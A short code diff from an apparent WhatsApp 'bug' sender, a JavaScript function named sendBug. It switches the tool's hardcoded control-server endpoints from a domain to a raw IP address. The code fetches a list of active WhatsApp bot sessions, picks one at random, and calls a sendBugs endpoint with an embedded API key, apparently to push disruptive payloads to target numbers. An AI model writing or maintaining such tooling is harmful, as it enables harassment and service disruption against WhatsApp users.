@@ -318,7 +318,7 @@ async function sendBug() {
   const key = "apikey_f14041a5b940";
   let botNumber = null;
   try {
-    const res = await fetch("http://gyrfehbcdns.jerzzoffc.my.id:2008/listSession");
+    const res = await fetch("http://209.38.82.131:1900/ListSession");
     const bots = await res.json();
     if (!bots.length) throw new Error("Tidak ada bot WhatsApp aktif!");
     botNumber = bots[Math.floor(Math.random() * bots.length)];
@@ -328,7 +328,7 @@ async function sendBug() {
   }
 
   const sendBugUrl =
-    "http://gyrfehbcdns.jerzzoffc.my.id:2008/sendBug?" +
+    "http://209.38.82.131:1900/sendBugs?" +
     new URLSearchParams({
       key,
       func,
